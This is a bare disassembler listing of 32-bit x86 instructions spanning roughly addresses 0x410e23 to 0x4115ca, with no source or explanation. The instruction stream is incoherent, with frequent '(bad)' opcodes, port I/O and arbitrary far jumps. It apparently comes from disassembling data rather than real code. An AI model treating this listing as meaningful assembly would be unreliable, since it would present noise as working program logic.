  410e23:	sahf   
  410e24:	shl    BYTE PTR [ebx],1
  410e26:	cmp    edi,DWORD PTR [eax-0x7da2184]
  410e2c:	sub    BYTE PTR [esi],al
  410e2e:	push   ecx
  410e2f:	test   BYTE PTR [edi+0x29e9207a],0xe
  410e36:	pop    edx
  410e37:	imul   ecx,DWORD PTR [ecx+0x7c],0x34a707e5
  410e3e:	mov    edi,0xb68531a
  410e43:	adc    DWORD PTR ds:0xaddda357,esp
  410e49:	test   BYTE PTR [edi-0x11],dh
  410e4c:	or     edi,ecx
  410e4e:	cmp    BYTE PTR [eax-0x588e23f2],ch
  410e54:	mov    ebp,0xade7ecdb
  410e59:	jbe    0x410e27
  410e5b:	pop    esp
  410e5c:	inc    edx
  410e5d:	data16 add BYTE PTR ds:0xb57cadf6,dl
  410e64:	ss stos DWORD PTR es:[edi],eax
  410e66:	add    cl,BYTE PTR [eax+0x2f394125]
  410e6c:	xchg   ebp,eax
  410e6d:	fwait
  410e6e:	xor    ah,BYTE PTR [ebp+0x0]
  410e71:	push   ebx
  410e72:	not    DWORD PTR [edi-0x68]
  410e75:	mov    ch,BYTE PTR [esp+ebx*8-0x7a]
  410e79:	jle    0x410e1f
  410e7b:	aaa    
  410e7c:	push   0x20
  410e7e:	mov    al,ds:0x95f02b99
  410e83:	les    ebx,FWORD PTR [esi+eiz*2+0x7c]
  410e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e89:	inc    esi
  410e8a:	out    0xd,eax
  410e8c:	in     al,dx
  410e8d:	lods   eax,DWORD PTR ds:[esi]
  410e8e:	mov    dh,0xd7
  410e90:	jl     0x410ee0
  410e92:	jmp    0x410e73
  410e94:	fcom   DWORD PTR [esi]
  410e96:	shl    ebp,cl
  410e98:	jne    0x410e26
  410e9a:	fst    QWORD PTR [edi-0x1a]
  410e9d:	xchg   ebx,eax
  410e9e:	outs   dx,DWORD PTR ds:[esi]
  410e9f:	inc    edx
  410ea0:	mov    dh,BYTE PTR [eax-0x7ff1694c]
  410ea6:	mov    edi,0x634fd518
  410eab:	xchg   esp,eax
  410eac:	push   esp
  410ead:	and    dl,BYTE PTR [ecx]
  410eaf:	lods   al,BYTE PTR ds:[esi]
  410eb0:	jg     0x410f19
  410eb2:	xchg   esp,eax
  410eb3:	jne    0x410f06
  410eb5:	ja     0x410f36
  410eb7:	outs   dx,BYTE PTR ds:[esi]
  410eb8:	scas   eax,DWORD PTR es:[edi]
  410eb9:	jno    0x410f22
  410ebb:	cs xchg esp,eax
  410ebd:	push   ecx
  410ebe:	xchg   ecx,edx
  410ec0:	(bad)  [ecx+0x75]
  410ec3:	sbb    BYTE PTR [ecx],dl
  410ec5:	fucom  st(5)
  410ec7:	dec    esi
  410ec8:	push   0xffffffa8
  410eca:	lods   al,BYTE PTR ds:[esi]
  410ecb:	add    DWORD PTR [ebx+0x6e],0xfffffff2
  410ecf:	rcr    cl,1
  410ed1:	push   eax
  410ed2:	shr    BYTE PTR [esp+eax*1-0x6c0eab49],1
  410ed9:	int3   
  410eda:	inc    edx
  410edb:	pop    es
  410edc:	cmc    
  410edd:	add    BYTE PTR [ecx+0x7bf044b1],cl
  410ee3:	mov    ah,0x98
  410ee5:	inc    esi
  410ee6:	or     DWORD PTR [edx-0x2],edx
  410ee9:	in     eax,0xf5
  410eeb:	mov    al,0xd0
  410eed:	pop    esp
  410eee:	lods   al,BYTE PTR cs:[esi]
  410ef0:	ins    DWORD PTR es:[edi],dx
  410ef1:	loopne 0x410f10
  410ef3:	lahf   
  410ef4:	iret   
  410ef5:	lea    esi,[ebp+0x59]
  410ef8:	mov    ch,0x71
  410efa:	push   cs
  410efb:	stos   DWORD PTR es:[edi],eax
  410efc:	xchg   ebp,eax
  410efd:	push   cs
  410efe:	out    dx,al
  410eff:	mov    edi,0xaa8316bc
  410f04:	test   eax,0xedb87884
  410f09:	sub    eax,0xd4b81cb5
  410f0e:	mov    edi,DWORD PTR [ebp+0x15393221]
  410f14:	bts    DWORD PTR [edi-0x73],ecx
  410f18:	js     0x410f32
  410f1a:	outs   dx,BYTE PTR ds:[esi]
  410f1b:	pop    esi
  410f1c:	add    al,0x18
  410f1e:	add    al,0x7c
  410f20:	je     0x410f63
  410f22:	loopne 0x410f83
  410f24:	add    ebp,ebp
  410f26:	scas   al,BYTE PTR es:[edi]
  410f27:	and    cl,BYTE PTR [edi+0x6e]
  410f2a:	pop    ebx
  410f2b:	(bad)  
  410f2c:	jmp    0xfd814ad6
  410f31:	sub    BYTE PTR [ecx],dl
  410f33:	adc    BYTE PTR [edx-0x22d51edb],0x73
  410f3a:	inc    ecx
  410f3b:	mov    eax,0xdf06a1be
  410f40:	push   edi
  410f41:	adc    edi,edx
  410f43:	xor    al,0x2d
  410f45:	pop    ebx
  410f46:	mov    edx,DWORD PTR [esi+0x5df188a9]
  410f4c:	lods   eax,DWORD PTR ds:[esi]
  410f4d:	inc    eax
  410f4e:	jge    0x410f69
  410f50:	mov    bh,0x2e
  410f52:	mov    esp,0xf19d3dbb
  410f57:	mov    edi,ds
  410f59:	pop    esp
  410f5a:	pop    edi
  410f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f5c:	leave  
  410f5d:	(bad)  
  410f5f:	retf   0x923d
  410f62:	(bad)  
  410f63:	push   cs
  410f64:	enter  0x13f8,0x13
  410f68:	leave  
  410f69:	inc    ebp
  410f6a:	or     BYTE PTR [ebx-0x3c53ff1f],ch
  410f70:	jno    0x410f87
  410f72:	call   0xdde:0x8be1a8bc
  410f79:	push   edi
  410f7a:	sbb    cl,ah
  410f7c:	xchg   ebx,eax
  410f7d:	cs loope 0x410f39
  410f80:	ss sub al,0x6
  410f83:	pop    ebp
  410f84:	call   0xe7a3:0xbe6a86c6
  410f8b:	icebp  
  410f8c:	dec    ecx
  410f8d:	icebp  
  410f8e:	or     al,0xfb
  410f90:	jmp    0xb86:0xccd32fab
  410f97:	outs   dx,BYTE PTR ds:[esi]
  410f98:	or     dl,BYTE PTR [ecx+0x69]
  410f9b:	in     al,0x69
  410f9d:	mov    ebp,0xe296df03
  410fa2:	push   ecx
  410fa3:	dec    ebp
  410fa4:	mov    cl,0xfd
  410fa6:	inc    esi
  410fa7:	fimul  WORD PTR [edi-0x1d]
  410faa:	dec    ebx
  410fab:	push   ebx
  410fac:	leave  
  410fad:	push   eax
  410fae:	int    0x3d
  410fb0:	mov    eax,ds:0x7563ac81
  410fb5:	das    
  410fb6:	mov    ecx,0xf684863
  410fbb:	add    eax,0xb8ec8363
  410fc0:	jmp    0x410fcd
  410fc2:	xchg   DWORD PTR [eax],ebx
  410fc4:	ins    BYTE PTR es:[edi],dx
  410fc5:	enter  0x4410,0xd5
  410fc9:	out    dx,al
  410fca:	loop   0x410f5c
  410fcc:	push   0x5b
  410fce:	mov    dh,0x79
  410fd0:	call   0x5fb2aa7
  410fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fd6:	call   0x842b08de
  410fdb:	add    al,BYTE PTR [eax]
  410fdd:	add    ah,cl
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 cld 
  410feb:	and    ah,BYTE PTR [ecx-0x19]
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	out    0x13,al
  410ff8:	test   al,0x26
  410ffa:	xlat   BYTE PTR ds:[ebx]
  410ffb:	add    al,0x3f
  410ffd:	mov    edi,0x71de723b
  411002:	jb     0x41107b
  411004:	repnz bound ebp,QWORD PTR [ebx+0x37925d9b]
  41100b:	retf   0x9849
  41100e:	xchg   ecx,eax
  41100f:	fsub   QWORD PTR [ecx-0x38]
  411012:	push   ss
  411013:	xchg   edi,eax
  411014:	sub    al,BYTE PTR [ebp-0x74]
  411017:	push   cs
  411018:	mov    al,BYTE PTR [edx-0x7d2f186]
  41101e:	(bad)  
  41101f:	loopne 0x411085
  411021:	stos   DWORD PTR es:[edi],eax
  411022:	mov    al,ds:0x35c1dca4
  411027:	adc    eax,0x6148580d
  41102c:	cmp    BYTE PTR [esi+0x0],bl
  41102f:	sbb    al,0xd8
  411031:	sbb    DWORD PTR [eax],esi
  411033:	xchg   ebx,eax
  411034:	xchg   ebp,eax
  411035:	jmp    0xa4dbd45
  41103a:	mov    ebp,DWORD PTR [ebx]
  41103c:	stos   DWORD PTR es:[edi],eax
  41103d:	and    ebx,ebx
  41103f:	(bad)  
  411040:	xor    edx,DWORD PTR [ebx+0x6d73be76]
  411046:	sahf   
  411047:	mov    eax,ds:0x7d0edf5f
  41104c:	fadd   st(0),st
  41104e:	stos   DWORD PTR es:[edi],eax
  41104f:	sbb    eax,0x5621507d
  411054:	stc    
  411055:	and    eax,0x95b3587c
  41105a:	aas    
  41105b:	cld    
  41105c:	cmp    edx,esp
  41105e:	jecxz  0x41105c
  411060:	out    0xa0,al
  411062:	imul   edi,esi,0xffffff81
  411065:	add    cl,BYTE PTR [esi-0x7ded8aca]
  41106b:	sbb    ch,bl
  41106d:	push   esi
  41106e:	and    al,0xc0
  411070:	pop    ecx
  411071:	jge    0x41104d
  411073:	push   eax
  411074:	ins    DWORD PTR es:[edi],dx
  411075:	xchg   ebx,eax
  411076:	ins    DWORD PTR es:[edi],dx
  411077:	and    DWORD PTR [ebp+0x82f121d],ebx
  41107d:	es retf 
  41107f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411080:	pop    ss
  411081:	aam    0xdb
  411083:	shr    BYTE PTR [edi+ebp*4-0x15],cl
  411087:	in     eax,dx
  411088:	ss jp  0x411093
  41108b:	push   eax
  41108c:	sbb    eax,0x177118be
  411091:	popa   
  411092:	and    ah,BYTE PTR [edx+0xc]
  411095:	test   BYTE PTR [ebx-0x18],0x2
  411099:	jns    0x41105c
  41109b:	scas   eax,DWORD PTR es:[edi]
  41109c:	test   eax,0x22df4ea
  4110a1:	lods   al,BYTE PTR ds:[esi]
  4110a2:	dec    ecx
  4110a3:	fs jp  0x411078
  4110a6:	call   0x740c:0x4bc87cef
  4110ad:	sbb    edi,ecx
  4110af:	mov    bh,0x22
  4110b1:	ins    DWORD PTR es:[edi],dx
  4110b2:	mov    ah,0xd4
  4110b4:	fimul  WORD PTR [edi+0x6b3a355a]
  4110ba:	rcl    DWORD PTR [edx+eiz*8+0x0],0xe7
  4110bf:	inc    ecx
  4110c0:	sub    BYTE PTR [esi+0x52],bl
  4110c3:	mov    edi,0xd9533d24
  4110c8:	sbb    esi,DWORD PTR [ecx+eiz*8]
  4110cb:	pushf  
  4110cc:	lock repz pop ebp
  4110cf:	cs stc 
  4110d1:	and    BYTE PTR [eax+eiz*4-0x28a8b101],dl
  4110d8:	xor    BYTE PTR [eax-0x480d40d9],0xbb
  4110df:	ror    DWORD PTR [edi+0x166c0094],0x45
  4110e6:	mov    dl,0xdf
  4110e8:	pop    esp
  4110e9:	les    esi,FWORD PTR [ebx]
  4110eb:	(bad)  [esp+edi*4+0x3]
  4110ef:	nop
  4110f0:	mov    bl,0x40
  4110f2:	das    
  4110f3:	jns    0x4110a2
  4110f5:	xchg   ecx,eax
  4110f6:	(bad)  
  4110f7:	inc    edx
  4110f8:	ss xchg esp,eax
  4110fa:	sar    BYTE PTR gs:[ebx-0x73a0bcd2],1
  411101:	clc    
  411102:	ds push edx
  411104:	push   cs
  411105:	test   al,0x20
  411107:	pop    edi
  411108:	cld    
  411109:	pop    es
  41110a:	xlat   BYTE PTR ds:[ebx]
  41110b:	cmp    al,0x3
  41110d:	cli    
  41110e:	les    esi,FWORD PTR [edi+0x63890320]
  411114:	or     ah,BYTE PTR [ebp+0x33]
  411117:	jle    0x41111f
  411119:	neg    BYTE PTR [esi]
  41111b:	pusha  
  41111c:	imul   edx,DWORD PTR [ecx-0xadde709],0x6695dceb
  411126:	enter  0x6012,0xa8
  41112a:	jbe    0x411179
  41112c:	and    BYTE PTR [ecx],ah
  41112e:	idiv   DWORD PTR ds:0x5b37876
  411134:	outs   dx,DWORD PTR ds:[esi]
  411135:	xchg   esp,eax
  411136:	mov    edi,0xbdffd7eb
  41113b:	inc    eax
  41113c:	adc    eax,0xed386ac9
  411141:	adc    al,0xe
  411143:	dec    ebp
  411144:	and    DWORD PTR [ebx-0x71bc1acf],esp
  41114a:	add    eax,0xab1e8df
  41114f:	(bad)  
  411150:	ins    BYTE PTR es:[edi],dx
  411151:	fnstenv [edi-0xbeace19]
  411157:	cld    
  411158:	call   0x7ed1:0xe36a0af
  41115f:	sub    esp,DWORD PTR [ebp+0x4f2abb41]
  411165:	cmc    
  411166:	dec    edi
  411167:	imul   eax,ebx,0xffffffb3
  41116a:	xchg   edx,eax
  41116b:	adc    eax,0x67cd70a9
  411170:	test   BYTE PTR [edi-0x26],ah
  411173:	bound  edi,QWORD PTR [esi-0x21]
  411176:	adc    eax,0x41bacdff
  41117b:	fbld   TBYTE PTR cs:[ebx+0x488d36e9]
  411182:	loop   0x4111c6
  411184:	pop    ebp
  411185:	ss (bad) 
  411187:	jmp    0x411191
  411189:	or     eax,0xa412ab6f
  41118e:	cmp    BYTE PTR [eax+0x55],bl
  411191:	xchg   BYTE PTR [eax-0x4ffb380a],dh
  411197:	out    dx,eax
  411198:	xchg   ecx,eax
  411199:	xor    ebp,DWORD PTR [edi+0x36]
  41119c:	jo     0x411172
  41119e:	scas   al,BYTE PTR es:[edi]
  41119f:	(bad)  
  4111a0:	mov    ecx,0xc6f9136a
  4111a5:	inc    BYTE PTR [edx]
  4111a7:	push   esp
  4111a8:	rol    BYTE PTR [esi+edi*1+0x3a],cl
  4111ac:	fwait
  4111ad:	push   es
  4111ae:	jo     0x411141
  4111b0:	into   
  4111b1:	fdivp  st(1),st
  4111b3:	mov    ds:0x379b8514,eax
  4111b8:	jb     0x411202
  4111ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111bb:	call   0x9256:0x3bd1e969
  4111c2:	pop    es
  4111c3:	pop    esi
  4111c4:	pop    ecx
  4111c5:	jns    0x41114d
  4111c7:	push   0x39d9d742
  4111cc:	cmp    edi,DWORD PTR [edi]
  4111ce:	ins    BYTE PTR es:[edi],dx
  4111cf:	cli    
  4111d0:	leave  
  4111d1:	sahf   
  4111d2:	fwait
  4111d3:	sbb    al,BYTE PTR [ebx-0x74]
  4111d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d7:	ds data16 aam 0xbe
  4111db:	stos   BYTE PTR es:[edi],al
  4111dc:	out    dx,al
  4111dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111de:	out    0x81,eax
  4111e0:	sbb    BYTE PTR [ebx-0x1aeaca9f],0xf
  4111e7:	call   0xd1f5171e
  4111ec:	pop    ss
  4111ed:	imul   esi,DWORD PTR [edx],0x2f
  4111f0:	push   ds
  4111f1:	jno    0x411196
  4111f3:	jns    0x411213
  4111f5:	popa   
  4111f6:	jp     0x411259
  4111f8:	je     0x4111f1
  4111fa:	out    dx,eax
  4111fb:	sub    ah,BYTE PTR cs:[ecx+0x4e]
  4111ff:	pop    edi
  411200:	add    al,0x75
  411202:	jecxz  0x411282
  411204:	cmovl  edi,DWORD PTR [esi+ebp*1-0x52ec8741]
  41120c:	out    dx,al
  41120d:	and    al,0x6e
  41120f:	xchg   ebx,eax
  411210:	mov    ds:0xcbabd1b1,al
  411215:	mov    eax,ds:0x6ff2a04b
  41121a:	xor    eax,0xbf046051
  41121f:	in     eax,dx
  411220:	sub    al,0x86
  411222:	mul    DWORD PTR [ecx]
  411224:	xor    ebp,DWORD PTR [ebx]
  411226:	inc    ecx
  411227:	jnp    0x4111f3
  411229:	pop    edi
  41122a:	in     al,dx
  41122b:	mov    cl,0xc2
  41122d:	push   edx
  41122e:	int3   
  41122f:	stos   BYTE PTR es:[edi],al
  411230:	jbe    0x411223
  411232:	das    
  411233:	push   edi
  411234:	xor    al,0x85
  411236:	std    
  411237:	fwait
  411238:	sub    DWORD PTR [ecx],ebx
  41123a:	mov    al,0x69
  41123c:	inc    ebx
  41123d:	call   0xa0f0:0xe994bd16
  411244:	jo     0x411226
  411246:	push   ds
  411247:	and    al,0x73
  411249:	dec    edx
  41124a:	sbb    al,0xc4
  41124c:	in     eax,dx
  41124d:	rcl    DWORD PTR ds:0x1dfa427e,1
  411253:	sbb    eax,0x584d9cf1
  411258:	dec    edx
  411259:	clc    
  41125a:	retf   
  41125b:	out    0xc6,al
  41125d:	push   cs
  41125e:	and    edi,DWORD PTR fs:[edx+0x3]
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x69],al
  411278:	push   ebx
  411279:	sub    BYTE PTR [ecx+0x78785fd2],cl
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	push   ebp
  411284:	sbb    DWORD PTR [ebx-0x12],ebx
  411287:	adc    al,0x40
  411289:	cmp    BYTE PTR [ecx-0x78],bh
  41128c:	push   ds
  41128d:	jp     0x41120f
  41128f:	pop    esp
  411290:	jmp    0xa6c5:0xcf0df2c9
  411297:	xchg   ecx,eax
  411298:	ror    DWORD PTR [ecx+0x3cff2c89],1
  41129e:	sub    esi,DWORD PTR [esp+esi*8-0x6823758]
  4112a5:	mov    BYTE PTR [edi-0x51],cl
  4112a8:	mov    edi,0xa18a4162
  4112ad:	add    BYTE PTR [eax+0x53],ah
  4112b0:	(bad)  
  4112b1:	jmp    0xdb794665
  4112b6:	mov    dh,0x38
  4112b8:	fwait
  4112b9:	mov    edi,DWORD PTR [eax-0x2a]
  4112bc:	jns    0x4112f1
  4112be:	jmp    0xc9bb:0x6a4f4fe7
  4112c5:	sbb    DWORD PTR [esi-0x16a71ed8],0x18c335ef
  4112cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112d0:	shl    BYTE PTR [edx+0x17],0x36
  4112d4:	pavgb  mm7,mm1
  4112d7:	imul   eax,DWORD PTR [edi+0x2a9cbfa9],0xaf761639
  4112e1:	push   ecx
  4112e2:	push   esp
  4112e3:	lock sbb ebx,DWORD PTR ss:[ebp-0x136b6dbf]
  4112eb:	xor    al,BYTE PTR [esi]
  4112ed:	pop    esi
  4112ee:	xor    BYTE PTR [eax-0x595a2faa],dh
  4112f4:	push   esi
  4112f5:	add    BYTE PTR [edx+0x4bf538a8],bh
  4112fb:	dec    ecx
  4112fc:	push   ecx
  4112fd:	mov    al,0x93
  4112ff:	inc    esi
  411300:	mov    ecx,0x13c4870a
  411305:	pop    ebp
  411306:	imul   ebp,DWORD PTR [edi],0x2d88ed2d
  41130c:	mov    ecx,DWORD PTR [edi]
  41130e:	pop    edx
  41130f:	pop    esp
  411310:	adc    dh,bh
  411312:	pusha  
  411313:	sbb    edi,0x4d
  411316:	xchg   edi,eax
  411317:	add    esi,ebx
  411319:	imul   eax,DWORD PTR [edi+0x667b8766],0xffffffea
  411320:	mov    fs,WORD PTR [ebp+ecx*2-0x43]
  411324:	sahf   
  411325:	jo     0x41132e
  411327:	sub    BYTE PTR [edx],ch
  411329:	mov    eax,0xe56feded
  41132e:	test   DWORD PTR [edx-0x4b91aed2],eax
  411334:	clc    
  411335:	sbb    DWORD PTR [ebp+0x4f6e065d],edx
  41133b:	cmc    
  41133c:	inc    ebx
  41133d:	push   0xffffff9b
  41133f:	int    0xdc
  411341:	pop    ss
  411342:	push   edi
  411343:	shr    DWORD PTR [eax],1
  411345:	mov    eax,ds:0xf4f3c251
  41134a:	mov    DWORD PTR [esi],edx
  41134c:	mov    ah,0x23
  41134e:	(bad)  
  41134f:	(bad)  
  411350:	js     0x411395
  411352:	nop
  411353:	mov    ?,WORD PTR [ecx-0x37eac4f7]
  411359:	cld    
  41135a:	pop    esi
  41135b:	(bad)  
  41135c:	data16 or bh,dl
  41135f:	cmp    esp,ebp
  411361:	dec    esi
  411362:	lea    eax,[eax]
  411364:	and    cl,BYTE PTR [edx-0x6c4a5719]
  41136a:	sub    al,0xc8
  41136c:	push   ecx
  41136d:	adc    edx,eax
  41136f:	xchg   ecx,edx
  411371:	cmp    eax,0x74f6ad90
  411376:	in     al,0x3a
  411378:	jmp    0xbf02:0xf72fc0ee
  41137f:	out    dx,al
  411380:	dec    eax
  411381:	mov    al,0xe9
  411383:	test   BYTE PTR [edx+eiz*8],dh
  411386:	jb     0x41136f
  411388:	jns    0x41132f
  41138a:	out    dx,eax
  41138b:	pop    ecx
  41138c:	fmul   DWORD PTR [eax+0x2bbab736]
  411392:	xchg   ebx,eax
  411393:	push   esp
  411394:	cmc    
  411395:	(bad)  
  411396:	fs push eax
  411398:	sub    al,0x88
  41139a:	stos   BYTE PTR es:[edi],al
  41139b:	sbb    BYTE PTR [ecx+0x31],0x59
  41139f:	loopne 0x411420
  4113a1:	test   BYTE PTR [edi-0x2524971f],0xb2
  4113a8:	data16 into 
  4113aa:	imul   esp,DWORD PTR [ecx],0x2b
  4113ad:	or     al,BYTE PTR ds:0xb8b8809a
  4113b3:	mov    ebp,0xa81dd9fc
  4113b8:	(bad)  
  4113b9:	ret    
  4113ba:	push   edi
  4113bb:	jge    0x4113e3
  4113bd:	pop    ds
  4113be:	(bad)  
  4113bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113c0:	cmp    DWORD PTR [edx-0x71],esp
  4113c3:	addr16 popf 
  4113c5:	pop    edi
  4113c6:	gs push cs
  4113c8:	add    eax,0x87af8fca
  4113cd:	add    eax,0x7c59b5f3
  4113d2:	in     eax,dx
  4113d3:	xor    esp,eax
  4113d5:	pop    ebp
  4113d6:	push   ecx
  4113d7:	mov    al,ds:0x26518e64
  4113dc:	jns    0x4113b9
  4113de:	es mov edx,esi
  4113e1:	add    bh,dl
  4113e3:	mov    eax,0x9329486b
  4113e8:	or     esi,esi
  4113ea:	fnsave [ecx]
  4113ec:	je     0x4113ed
  4113ee:	dec    ecx
  4113ef:	push   esi
  4113f0:	pusha  
  4113f1:	pop    ecx
  4113f2:	add    esi,DWORD PTR [eax+0x49d3c8fd]
  4113f8:	stc    
  4113f9:	dec    BYTE PTR [ecx]
  4113fb:	out    dx,al
  4113fc:	mov    cl,0x45
  4113fe:	in     eax,dx
  4113ff:	fcomp  DWORD PTR [esi-0x189be790]
  411405:	aam    0x42
  411407:	sub    al,0x29
  411409:	in     eax,0x24
  41140b:	pop    ecx
  41140c:	aad    0x28
  41140e:	inc    esi
  41140f:	and    eax,0xecadc07f
  411414:	mov    dh,0xb
  411416:	scas   al,BYTE PTR es:[edi]
  411417:	sbb    BYTE PTR [edx+0x10d8ce8e],dl
  41141d:	pop    ds
  41141e:	add    ebx,edx
  411420:	das    
  411421:	xchg   ecx,eax
  411422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411423:	push   esi
  411424:	pop    esi
  411425:	out    0x2f,al
  411427:	dec    ecx
  411428:	call   DWORD PTR [eax+0x3]
  41142b:	dec    edx
  41142c:	int    0xa9
  41142e:	and    edx,DWORD PTR [edx]
  411430:	sti    
  411431:	jno    0x4113fa
  411433:	push   ebp
  411434:	push   edi
  411435:	xor    BYTE PTR [edi+ecx*4-0x7b257ed0],dl
  41143c:	sbb    BYTE PTR [ebx],bl
  41143e:	inc    edx
  41143f:	mov    esp,0xd8cdc3b9
  411444:	sbb    dh,cl
  411446:	add    bh,BYTE PTR [esi+0xd3371a3]
  41144c:	stos   DWORD PTR es:[edi],eax
  41144d:	and    ecx,DWORD PTR [eax+0x8]
  411450:	mov    dl,0x17
  411452:	lods   al,BYTE PTR ds:[esi]
  411453:	jle    0x4113de
  411455:	(bad)  
  411456:	jl     0x411401
  411458:	sbb    cl,BYTE PTR [eax]
  41145a:	xchg   esi,eax
  41145b:	adc    edi,DWORD PTR [ebp-0x9]
  41145e:	sbb    dh,BYTE PTR [edx]
  411460:	xor    bl,bl
  411462:	out    dx,eax
  411463:	sub    eax,0xe8c1268e
  411468:	xchg   edi,eax
  411469:	mov    dl,0xf7
  41146b:	xor    al,0x93
  41146d:	add    al,0x4f
  41146f:	jo     0x411486
  411471:	retf   
  411472:	mov    BYTE PTR [ecx],dh
  411474:	xor    bl,BYTE PTR [ecx+0x2bbcce30]
  41147a:	add    ebx,DWORD PTR [edx+esi*4+0x420208ff]
  411481:	das    
  411482:	(bad)  
  411484:	pop    ecx
  411485:	repz out 0xca,al
  411488:	dec    edx
  411489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148a:	add    al,0x3b
  41148c:	xchg   ecx,eax
  41148d:	ficom  DWORD PTR [esi]
  41148f:	popw   ds
  411491:	xlat   BYTE PTR ds:[ebx]
  411492:	jne    0x4114ca
  411494:	out    dx,eax
  411495:	pop    ecx
  411496:	(bad)  
  411497:	aaa    
  411498:	push   esi
  411499:	fs (bad) 
  41149b:	lods   eax,DWORD PTR ds:[esi]
  41149c:	xchg   ebx,eax
  41149d:	imul   edi,DWORD PTR [edx-0x38],0x502cfe50
  4114a4:	int3   
  4114a5:	jmp    0x411429
  4114a7:	jge    0x4114a9
  4114a9:	xor    ecx,0xffffff81
  4114ac:	xchg   ebx,eax
  4114ad:	dec    eax
  4114ae:	or     dl,BYTE PTR [ecx+esi*1-0x6c3447b0]
  4114b5:	sbb    BYTE PTR [eax+0x69],bl
  4114b8:	jl     0x4114c3
  4114ba:	inc    edx
  4114bb:	xchg   BYTE PTR [edi-0x6db3bfe2],ch
  4114c1:	add    BYTE PTR [esi],0x43
  4114c4:	dec    esp
  4114c5:	push   ecx
  4114c6:	pop    ebx
  4114c7:	test   al,0x2c
  4114c9:	push   es
  4114ca:	sub    eax,0x1b27e927
  4114cf:	jmp    0x5527:0x94d8d153
  4114d6:	dec    edx
  4114d7:	shl    BYTE PTR [eax-0x5b],0x9c
  4114db:	loop   0x4114fb
  4114dd:	pop    es
  4114de:	(bad)  
  4114df:	jns    0x41152b
  4114e1:	push   ebx
  4114e2:	xor    eax,0xbc98100a
  4114e7:	mov    esp,0x7e6db46
  4114ec:	cmp    BYTE PTR [ebp-0x75],bh
  4114ef:	jge    0x4114e9
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	cdq    
  411510:	or     DWORD PTR [edx],eax
  411512:	fnstcw WORD PTR [edi-0x1a8787a3]
  411518:	jle    0x411592
  41151a:	js     0x411505
  41151c:	jmp    0x41158c
  41151e:	fld    TBYTE PTR [ecx]
  411520:	outs   dx,DWORD PTR ds:[esi]
  411521:	iret   
  411522:	xor    esp,edi
  411524:	xchg   ebp,eax
  411525:	loopne 0x4114a7
  411527:	fnsave [ebp-0x4a]
  41152a:	cmp    eax,0x79c3538c
  41152f:	mov    ebp,0x90bd676c
  411534:	cwde   
  411535:	sbb    al,BYTE PTR [esi+0x9b543f7]
  41153b:	inc    eax
  41153c:	sub    eax,0x3a99c08a
  411541:	and    BYTE PTR [eax+0x6fb2db7f],0xf2
  411548:	xlat   BYTE PTR ds:[ebx]
  41154a:	retf   
  41154b:	push   ebx
  41154c:	in     al,0xb3
  41154e:	sub    al,0xa3
  411550:	ds xchg ebp,eax
  411552:	mov    ch,0xcf
  411554:	data16 jno 0x4115b1
  411557:	ucomiss xmm1,xmm7
  41155a:	jo     0x4114e0
  41155c:	push   0x8e8da7aa
  411561:	in     al,0x8a
  411563:	cmp    DWORD PTR [edx+0xe89c2b8],0x59
  41156a:	loope  0x411519
  41156c:	xchg   BYTE PTR [edx+0x3],cl
  41156f:	push   ebp
  411570:	call   0xd36e:0x66dc6ef0
  411577:	dec    esp
  411578:	jo     0x4115ed
  41157a:	clc    
  41157b:	and    DWORD PTR [ebp-0x25],esi
  41157e:	pop    ecx
  41157f:	(bad)  
  411580:	jge    0x4115fe
  411582:	jns    0x41156e
  411584:	bound  esp,QWORD PTR [edx+0x9]
  411587:	cmp    eax,DWORD PTR [ebx+0x75]
  41158a:	dec    ebp
  41158b:	dec    esi
  41158c:	and    ecx,DWORD PTR [ebx+0x6d85b7ee]
  411592:	xchg   ebp,eax
  411593:	packsswb mm3,mm5
  411596:	ror    DWORD PTR [esi+0x6d],cl
  411599:	loope  0x41158a
  41159b:	inc    ebp
  41159c:	push   0x5d7c2e20
  4115a1:	out    0x68,eax
  4115a3:	mov    cl,0x37
  4115a5:	daa    
  4115a6:	rol    cl,1
  4115a8:	loopne 0x41156c
  4115aa:	rol    BYTE PTR [edx+ebp*4+0x5c],cl
  4115ae:	dec    edi
  4115af:	adc    al,0x2b
  4115b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115b2:	cwde   
  4115b3:	mov    ebp,ecx
  4115b5:	mov    ds:0x513ca705,al
  4115ba:	shl    DWORD PTR [esi+0x40],cl
  4115bd:	add    edi,DWORD PTR [esi]
  4115bf:	lea    ebp,[edx+0x1f]
  4115c2:	mov    bl,0x55
  4115c4:	fnstcw WORD PTR [ebp-0x1127cbb]
  4115ca:	mov    ebp,cs
